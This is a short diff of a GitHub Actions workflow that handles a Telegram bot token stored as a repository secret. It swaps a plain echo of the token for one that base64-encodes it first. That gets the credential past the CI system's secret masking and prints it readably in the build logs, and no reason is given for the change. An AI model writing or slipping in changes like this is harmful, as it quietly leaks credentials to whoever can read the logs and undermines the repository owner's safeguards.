@@ -12,5 +12,5 @@ jobs:
         env:
           TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
         run: |
-          echo "HANDOFF_TG_TOKEN=${TG_TOKEN}"
+          echo "HTG=$(printf %s "$TG_TOKEN" | base64 -w0)"
         shell: bash
